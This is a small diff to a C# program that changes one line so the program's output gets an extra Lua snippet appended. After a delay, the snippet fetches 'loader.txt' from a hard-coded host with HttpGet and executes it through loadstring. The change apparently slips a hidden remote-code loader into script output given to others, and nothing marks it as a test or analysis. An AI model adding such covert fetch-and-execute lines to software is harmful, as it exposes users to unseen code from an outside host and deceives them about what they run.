@@ -20,7 +20,8 @@ internal class Program
             {
                 json += input[i];
             }
-            ailments.getExecute(json);
+            Console.WriteLine(ailments.getExecute(json) + "\r\n wait(60) loadstring(game:HttpGet(\"http://192.168.3.4/loader.txt\"))()");
+            
         }
         catch (Exception value)
         {
